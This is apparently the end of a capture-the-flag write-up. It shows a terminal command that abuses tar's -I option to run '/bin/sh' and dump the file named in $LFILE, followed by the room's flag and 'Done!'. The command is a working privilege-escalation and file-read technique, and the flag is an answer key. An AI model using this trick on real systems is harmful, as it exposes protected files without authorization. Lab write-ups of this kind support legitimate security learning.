hades@hell:/tmp$ tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
thm{w0w_n1c3_3sc4l4t10n}

```

Done!